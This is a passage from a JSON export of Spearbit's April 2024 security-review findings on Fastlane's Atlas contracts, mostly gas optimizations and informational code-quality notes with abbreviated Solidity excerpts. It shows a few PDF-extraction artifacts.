        "body": "Function _getSolverHash() uses a calldata, but other comparable functions use memory, which costs more gas. All functions could use calldata. function _getSolverHash(SolverOperation calldata solverOp) /*...*/ { } function _getProofHash(DAppOperation memory approval) /*...*/ { } function _getProofHash(UserOperation memory userOp) /*...*/ { } function getUserOperationHash(UserOperation memory userOp) /*...*/ { } function getAltOperationHash(UserOperation memory userOp) /*...*/ { }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Async vs sequential vs sequenced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are multiple terms to indicate the same concept, which can be confusing:  async  sequential  sequenced Especially combined with negating (!) the values, the risk for confusion increases. function _verifyDApp( // ... if (!_handleNonces(..., !dConfig.callConfig.needsSequencedDAppNonces(), ...)) { // uses ! // ... } // ... } function _verifyUser( // ... if (!_handleNonces(..., !dConfig.callConfig.needsSequencedUserNonces(), ...)) { // uses ! // ... } // ... } function _handleNonces(/*...*/ , bool async, /*...*/ ) internal returns (bool) { // ... if (!async) { // uses ! // SEQUENTIAL NONCES // ... } else { // ASYNC NONCES // ... } } /// @param sequenced A boolean indicating if the nonce should be sequential (true) or async (false). function getNextNonce(..., bool sequenced) external view returns (uint256) { // ... } function needsSequencedUserNonces(...) internal pure returns (bool sequenced) { // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Checks in function _verifyDApp() can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _verifyDApp() defines and assigns the variable bypassSignatoryCheck twice with the same value. This can be optimized. The first time the variable isn't used, which means simulation mode isn't handled optimally. This might allow transactions to be bundled that waste gas. function _verifyDApp( // ... bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); // not used if (!isSimulation) { // should probably be bypassSignatoryCheck return (false, ValidCallsResult.InvalidBundler); } // ... bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); // same value as above if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); } // ... if (dAppOp.from == address(0) && isSimulation) { return (true, ValidCallsResult.Valid); } } The situation where dAppOp.from == address(0) would be true only for simUserOperation() calls via the Sim- ulator (because these sims may be done before a dAppOp is available, so will not be able to check e.g. dapp sig or dapp nonce) and not for simulations involving solverOp(s), as those take a dAppOp param, so those dAppOp properties can be checked.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Mimic can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Any call to ExecutionEnvironment goes through Mimic which appends userOp.from, control, call config, control.codehash to the calldata: library 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa is standin for the ExecutionEnvironment, which is a de facto ,! 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB is standin for the user 0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC is standin for the dApp control address 0x2222 is standin for the call configuration 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee is the dApp control contract ,! s EOA address s   .codehash This is to ensure that a unique ExecutionEnvironment is deployed for this combination and also to verify that correct parameters are passed to any external call to ExecutionEnvironment. Including these parameters in the create2 salt ensures the uniqueness of deployment address. Also, since Exe- cutionEnvironment can only be called from atlas, we can be sure that correct parameters are passed assuming correct code. Thus, the verification steps like the following can be skipped: if (userOp.from != _user()) { revert(\"ERR-CE02 InvalidUser\"); } Here, _user() parses user address from the appended calldata. Thus, following this logic, we can remove appending userOp.from, control, call config to the calldata as they all can be retrieved from function arguments already. control.codehash is used for the following check: modifier validControlHash() { if (_control().codehash != _controlCodeHash()) { revert(\"ERR-EV008 InvalidCodeHash\"); } _; } This check is to account for the possibility of changing the code via selfdestruct? With Dencun upgrade, selfdestruct can destroy the code only when called in the creation tx (rollups and other EVM chains haven't upgraded to Dencun yet). However, there are cases where this check doesn't provide any protection against:  If control is a proxy, the implementation can change without changing its codehash.  control can change its execution without using proxy by detecting which stage Atlas is in. By calling solver- MetaTryCatch and checking it's in lock state or not. Although, with this malicious behavior, it likely won't be used by an honest user or an honest dapp.  control can also change its behavior based on its state which isn't included in codehash. Also see:  Function _getMimicCreationCode relies on Solidity format for offsets  Function _getMimicCreationCode relies on Solidity format for layout",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Passing of key can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Some functions (like _executeSolverOperation() and _allocateValue()) do:  Pass key as a parameter.  Do key.hold...Lock() inside the function.  Do key.pack() inside the function.  Return key. One function _getBidAmount() does:  Pass key as a parameter.  Do key.hold...Lock() inside the function.  Do key.pack() inside the function.  It doesn't return key, but key is still updated. Other functions (like _executePreOpsCall(), _executeUserOperation(), _executePostOpsCall() ) do:  Do key.hold...Lock() before the call.  Pass key.pack() as a parameter. Some functions (like _bidFindingIteration(), _bidKnownIteration(), holdPreOpsLock(), holdUserLock(), holdSolverLock(), holdAllocateValueLock(), holdPostOpsLock() ) do:  Pass key as a parameter. 78  Return key. The main reasons for the differences are the \"stack too deep\" error. However it would be more consistent and easier to read if the same pattern is used everywhere.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Code duplications for call to _allocateValue()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Both _bidFindingIteration() and _bidKnownIteration() are called from execute() and each calls _allocateValue(). It is more logical to do the calls to _allocateValue() from execute() because that is also the place where _executePostOpsCall() is called. This also reduces code duplication and thus reduces deployment size and cost. function execute(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig.exPostBids()) { (auctionWon, key) = _bidFindingIteration(dConfig, userOp, solverOps, returnData, key); } else { (auctionWon, key) = _bidKnownIteration(dConfig, userOp, solverOps, returnData, key); } if (!auctionWon) { // ... } // else /*...*/ this would be a good place to call _allocateValue() // ... bool callSuccessful = _executePostOpsCall(auctionWon, returnData, key); // ... } function _bidFindingIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation(/*...*/ ); 79 if (auctionWon) { key = _allocateValue(dConfig, solverOps[bidPlaceholder], bidAmounts[bidPlaceholder], ,! returnData, key); key.solverOutcome = uint24(bidPlaceholder); return (auctionWon, key); } // ... } function _bidKnownIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation(/*...*/ ); if (auctionWon) { key = _allocateValue(dConfig, solverOp, solverOp.bidAmount, returnData, key); key.solverOutcome = uint24(i); return (auctionWon, key); } // ... } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.executionSuccessful()) { key.solverSuccessful = true; return (true, key); // auctionWon = true } // ... } Also see:  Locking mechanism is complicated",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use _deposits instead of the storage variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "deposits is a storage variable and its value is already copied in stack at _deposits. deposits is still used to read the value.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "if conditions always pass",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "reconcile() first enforces a condition, then does two if conditions on the same boolean expression: if (calledBack) revert DoubleReconcile(); // ... if (/*...*/ ) { if (!calledBack) { _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; } // ... } // ... if (!calledBack || !fulfilled) { calledBack is always false when the execution reaches these if conditions, otherwise it'd revert.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "keccak can be computed at compile time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Following hash is computed at every permit() call: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" ), This hash can be calculated once and reused since this value is known at compile time.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Structs can be kept in storage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Highlighted code above follow a similar pattern. They copy a storage struct to memory, make changes to it, and then use the copy to update back the storage struct. One example: EscrowAccountAccessData memory aData = accessData[owner]; aData.bonded -= amt; aData.lastAccessedBlock = uint32(block.number); accessData[owner] = aData; This has extra gas overhead as the entire struct is copied from and to storage just to update a few struct members. Keeping the struct in storage avoids this overhead.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace pendingSurchargeRecipient with msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "pendingSurchargeRecipient is read multiple times. after it's checked they are equal. Its usage can be replaced with msg.sender",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "SafeMath can be skipped for Solidity 0.8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Solidity 0.8 has checked math, so SafeMath isn't necessary.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simulation code path can be kept off-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Removing simulation mode from contracts simplifies the protocol (removing a lot of branching) and also reduces gas usage.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "callSequenceHash can be gas-optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The way callSequenceHash is calculated can be changed to reduce its gas consumption. The off-chain software to calculate this hash can be updated too, to match the new onchain version.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "preSolverCall() can revert instead of returning false",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Decoding return data from preSolverCall() can be avoided if it reverts instead of returning false. bytes memory data = forwardSpecial( abi.encodeWithSelector(IDAppControl.preSolverCall.selector, solverOp, returnData), ExecutionPhase.PreSolver ); (success, data) = control.delegatecall(data); if (!success) { revert AtlasErrors.PreSolverFailed(); } success = abi.decode(data, (bool)); if (!success) { revert AtlasErrors.PreSolverFailed(); } Note: abi.decode() itself can also revert it the supplied data is in an incorrect format.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache withdrawals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The highlighted code can be optimized to avoid calculating new withdrawal amount and reading storage variable withdrawals twice.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "metacall() sends msg.value without need",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function metacall() calls this.execute() and sends msg.value. Because execute() is in the same contract this keeps the same amount of ETH in the contract. The administration msg.value is done via _setAtlasLock() and deposits, so that is no reason to send msg.value. Note: It would be relevant to send msg.value if execute() was located in another contract. In that case it might be more logical to send userOp.value than msg.value. function metacall(/*...*/ ) /*...*/ { // ... _setAtlasLock(executionEnvironment, gasMarker, userOp.value); try this.execute{ value: msg.value }(/*...*/ ) // ... function _setAtlasLock(address executionEnvironment, uint256 gasMarker, uint256 userOpValue) internal { // ... deposits = msg.value; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider documenting why specific AtlETH balances types are used in _assign()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the _assign() function, the solver has their AtlETH balance reduced. Specifically their .bonded balance of AtlETH is reduced first, and if that alone is insufficient, their .unbonding balance of AtlETH is reduced as well. If both amounts combined are still insufficient, the function will not draw from the solver's regular .balance of AtlETH, and instead will return isDeficit == true. The reason for this behavior is likely that a solver's regular .balance of AtlETH is meant to be independent and not used within an Atlas transaction. In this case, it may be worth explicitly documenting this so the code can be easily understood.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "callIndex and callCount don't track the allocateValue() call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The callIndex variable tracks the number of calls that have been executed (or skipped, depending on the callConfig) during an Atlas transaction. The callCount variable tracks the total number of calls that may be executed during the transaction. However, neither variable tracks the call to the allocateValue() function. It may be desirable to include this in the count, as certain DAppControl contracts may find this useful.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Loop counter can be declared with for statement",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Above code declares the for loop counter as a separate variable: uint256 i; for(;/*...*/ ; i++) { // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "TODOs left in the code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are TODO comments present in the code. These include:  Atlas.sol#L58: // NOTE: Currently reverting instead of graceful return to help w/ testing. TODO - still ,! reverting?  Atlas.sol#L141: // TODO: point key.addressPointer at bundler if all fail.  AtlasVerification.sol#L332-L337: // TODO: consider dapp-owned gas escrow. Enshrined account // abstraction may render that redundant at a large scale, but // allocating different parts of the tx to different parties // will allow for optimized trustlessness. This could lead to // users not having to trust the front end at all - a huge // improvement over the current experience.  AtlasVerification.sol#L545: Note that this would be addressed by the issue \"Call to validateUserOp() won't work\". // TODO: not sure if 30k gas limit is accurate  Escrow.sol#L290: // NOTE: Turn this into time stamp check for FCFS L2s? 87  Escrow.sol#L379: Note that a full uint256 does appear safe from overflow in the current code. sub(mload(data), 32) // TODO: make sure a full uint256 is safe from overflow  Factory.sol#L174: Note that this would be solved by the issue \"Mimic can be optimized\". // TODO: unpack the SHL and reorient  GasAccounting.sol#L271: Note that this would be solved by the issue \"Consider penalizing bundlers for unused gas\". // TODO: consider penalizing bundler for too much unused gas (to prevent high escrow ,! requirements for solvers)  GasAccounting.sol#L284: Note that this is related to the issue \"Incorrect SURCHARGE multiplication\". // TODO: make sure this works w/ the surcharge 10%  Storage.sol#L80: // TODO remove these when transient storage behaviour is implemented  ExecutionBase.sol#L50: // TODO: simplify this into just the bytes  ExecutionBase.sol#L74: // TODO: simplify this into just the bytes  SwapIntent.sol#L101: // TODO: If user is Selling Eth, convert it to WETH rather than rejecting.  SwapIntent.sol#L103: // TODO: Could maintain a balance of \"1\" of each token to allow the user to save gas over ,! multiple uses  SwapIntent.sol#L190-L191: // TODO: Permit69 is currently enabled during solver phase, but there is low conviction that ,! this // does not enable an attack vector. Consider enabling to save gas on a transfer?  ChainlinkAtlasWrapper.sol#L7: import \"forge-std/Test.sol\"; //TODO remove  SafetyBits.sol#L6-L8: // TODO remove //import {TestUtils} from \"../../../test/base/TestUtils.sol\"; // import \"forge-std/Test.sol\";  SafetyBits.sol#L111: 88 self.addressPointer = address(0); // TODO: Point this to bundler (or builder?) if all solvers ,! fail",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Bundlers reimburse themselves if all solvers fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "If an Atlas transaction interacts with a DAppControl that specifies needsFulfillment() == false, it's possible that all solverOps fail and auctionWon == false will be returned from the execute() function. If this happens, the bundler will be treated as the winning solver in the _settle() function: (uint256 ethPaidToBundler, uint256 netGasSurcharge) = _settle({ winningSolver: auctionWon ? solverOps[winningSolverIndex].from : msg.sender, bundler: msg.sender }); This implies that bundlers can be required to reimburse themselves for gas costs, which can be inefficient if they don't have an existing AtlETH balance to temporarily draw from. This also means that a bundler would be paying the surcharge on gas costs, which can introduce a motivation to intentionally revert the entire transaction to avoid this (which can be achieved with a revert during the final safeTransferETH() call).",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Which party should receive the surplus ETH?",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_validCalls() allows to be more ETH supplied than required (e.g. msg.value > userOp.value). The difference is apperent in withdrawals and deposits. _settle() will give this difference to the winning solver or to msg.sender (e.g. the bundler). In case of an error all the ETH is send to msg.sender (e.g. the bundler). Perhaps it is more logical to send the difference to msg.sender (e.g. the bundler). function _validCalls(/*...*/ ) /*...*/ { // ... // Check that the value of the tx is greater than or equal to the value specified if (msgValue < userOp.value) { return (userOpHash, ValidCallsResult.TxValueLowerThanCallValue); } // ... } function metacall(/*...*/ ) /*...*/ { // ... _setAtlasLock(executionEnvironment, gasMarker, userOp.value); try this.execute{ value: msg.value }(dConfig, userOp, solverOps, executionEnvironment, msg.sender, userOpHash) ,! 89 returns (bool _auctionWon, uint256 winningSolverIndex) { (uint256 ethPaidToBundler, /*...*/ ) = _settle({ /*...*/ , bundler: msg.sender }); } catch (bytes memory revertData) { ... // Refund the msg.value to sender if it errored if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); } } function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert /*...*/ ; } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } function _setAtlasLock(address executionEnvironment, uint256 gasMarker, uint256 userOpValue) internal { // ... withdrawals = userOpValue; deposits = msg.value; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "No error code for failed _trySolverLock()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "If _trySolverLock(solverOp) == false there is no error assigned to result, it just stays 0. The 0 value is later on used in the updateEscrow() check and in an emit. The updateEscrow() check is less fine grained this way. Troubleshooing on basis of the emitted event is somewhat difficult. 90 function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... } // ... key.solverOutcome = uint24(result); // result could be 0 if _trySolverLock fails _releaseSolverLock(/*...*/ , result, /*...*/ ); // ... emit SolverTxResult(solverOp.solver, solverOp.from, result.executedWithError(), false, result); // result could be 0 // ... ,! } function _releaseSolverLock(/*...*/ ) /*...*/ { // ... if (!bidFind && !result.updateEscrow()) return; // result could be 0 // ... } function updateEscrow(uint256 result) internal pure returns (bool) { return (result & _NO_REFUND == 0); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Parameter callConfig seems redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In transferUserERC20() and transferDAppERC20(), which call _verifyCallerIsExecutionEnv() a check is done for msg.sender == _getExecutionEnvironmentCustom. This can only be the case with the current callConfig, because metacall() / _getOrCreateExecutionEnvironment() retrieves getDAppConfig(userOp).callConfig. However transferUserERC20() and transferDAppERC20() allow specifing callConfig, which only has added value if getDAppConfig(userOp).callConfig changes in between calls in the same transaction, which seems far fetched. 91 function transferUserERC20(..., address user, address controller, uint32 callConfig ,/*...*/ ) /*...*/ { _verifyCallerIsExecutionEnv(user, controller, callConfig); } function transferDAppERC20(..., address user, address controller, uint32 callConfig ,/*...*/ ) /*...*/ { _verifyCallerIsExecutionEnv(user, controller, callConfig); } function _verifyCallerIsExecutionEnv(address user, address controller, uint32 callConfig) internal view ,! override { if (msg.sender != _getExecutionEnvironmentCustom(user, controller.codehash, controller, callConfig)) { ,! revert EnvironmentMismatch(); } } /// @notice Generates the address of a user ,! /// DAppControl. function _getExecutionEnvironmentCustom(/*...*/ ) /*...*/ { changes in the  s execution environment affected by deprecated callConfig // generate address based on user, controlCodeHash, controller, callConfig, _salt } function metacall(/*...*/ ) /*...*/ { /*...*/ (address executionEnvironment, /*...*/ ) = _getOrCreateExecutionEnvironment(userOp); /*...*/ } function _getOrCreateExecutionEnvironment(/*...*/ ) /*...*/ { address control = userOp.control; dConfig = IDAppControl(control).getDAppConfig(userOp); executionEnvironment = _setExecutionEnvironment(control, userOp.from, dConfig.callConfig, control.codehash); ,! }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prevent abuse of transferDAppERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "If a userOp does a delegatecall, the destination contract could use transferDAppERC20() to trans- fer tokens from the DappControl contract. This is a feature but could also be abused.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "How to prevent malicious DappControl contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "A malicious DappControl contract could move all of the user's tokens, for which they have given an allowance to Atlas. This can be done via transferUserERC20(). A malicious DappControl contract could also set allowances for random tokens of an ExecutionEnvironment. That might be abused later on in combination with an external call from the ExecutionEnvironment.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "_availableFundsERC20() is optional which is not clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _availableFundsERC20() does several checks to make sure transferUserERC20() and/or transferDAppERC20() will succeed. Functions transferUserERC20() and/or transferDAppERC20() check these limits again so the use of _availableFundsERC20() is optional, but this might not be clear. function _availableFundsERC20(/*...*/ ) /*...*/ { // checks balance, phase, source and allowance }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Internal functions forward() and forwardSpecial() not prefixt with _",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "forward() and forwardSpecial() functions are internal but the function name doesn't start with _, unlike most other internal functions. function forward(bytes memory data) internal pure returns (bytes memory) { // ... } function forwardSpecial(bytes memory data, ExecutionPhase phase) internal pure returns (bytes memory) { // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Outdated comment in _allocateValueCall() of V2DAppControl",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_allocateValueCall() has an outdated comment because governance tokens are not burnt but sent to the user. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... /* console.log(\"Governance Tokens Burned:\", govIsTok0 ? amount0Out : amount1Out); */ // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "transfer() is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "V2DAppControl uses transfer() which isn't best practice. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... ERC20(WETH).transfer(WETH_X_GOVERNANCE_POOL, bidAmount); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Math calculations could be bundled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _allocateValueCall() contains some math calculations and the library SwapMath also contains math calculations. For consistency they could be bundled in one place. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... if (govIsTok0) { amount0Out = ((997_000 * bidAmount) * uint256(token0Balance)) / ((uint256(token1Balance) * 1_000_000) + (997_000 * bidAmount)); } else { amount1Out = ((997_000 * bidAmount) * uint256(token1Balance)) / (((uint256(token0Balance) * 1_000_000) + (997_000 * bidAmount))); } // ... } 94",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Array lengths not checked in transmit() nor _verifyTransmitData()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Neither transmit() nor _verifyTransmitData() nor verifyTransmitSigners() checks the lenght of rs versus ss. In _verifyTransmitData():  When r.observations.length == 0 then the for loop will revert.  r.observations.length might be able to be compared to rs.length. In verifyTransmitSigners():  If rs.length > MAX_NUM_ORACLES then rawVs[i] will get out of bounds because it is only 32 bytes large. These situations could be used to detect mismatches and revert with a clear message. function transmit(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss, /*...*/ ) /*...*/ { // ... int256 answer = _verifyTransmitData(report, rs, ss, rawVs); // ... } function _verifyTransmitData(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss, /*...*/ ) /*...*/ { // ... for (uint256 i = 0; i < r.observations.length - 1; ++i) { // revert when length == 0 // ... } bool signersVerified = IChainlinkDAppControl(DAPP_CONTROL).verifyTransmitSigners(address(BASE_FEED), report, rs, ss, rawVs); ,! } function verifyTransmitSigners(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss,/*...*/ ) /*...*/ { // ... for (uint256 i = 0; i < rs.length; ++i) { /*...*/ uint8(rawVs[i]) /*...*/ // could get out of bounds } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Old term metaFlashCall used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Several test files mention metaFlashCall. This is a deprecated term. // This ensures a function can only be called through metaFlashCall // which includes security checks to work safely with Atlas modifier onlySelf() { require(msg.sender == address(this), \"Not called via metaFlashCall\"); _; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Sorting same bids result in reverse order",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "If multiple Solvers have the same bid then the sorted order is the reverse of the input order. This is due to the >= operator in the if statement. function _sort(/*...*/ ) /*...*/ { // ... for (j = 0; j < count;) { if (sortingData[j].valid && sortingData[j].amount >= topBidAmount) { topBidAmount = sortingData[j].amount; topBidIndex = j; } unchecked { ++j; } } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Initialization with 0 is inconsistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Sometimes variables are initialized with 0, and sometimes they are not initialized. This is not consis- tent. uint256 i = 0; for (uint256 i = 0; i < /*...*/ ; i++) { // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "unchecked not necessary in for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "for loop index parameter increments no longer need unchecked in Solidity 0.8.22, see Solidity docs unchecked-loop-increment. function _bidKnownIteration(/*...*/ ) /*...*/ { // ... for (; i < k;) { // ... unchecked { ++i; } } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Double negations in comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The comments in function updateEscrow() use double negations, which are difficult to read. function updateEscrow(uint256 result) internal pure returns (bool) { // dont update solver escrow if they don // returns true is solver doesn return (result & _NO_REFUND == 0);   t need to refund gas t get to bypass the refund. }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function getCallChainHash() could use needsPreOpsCall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
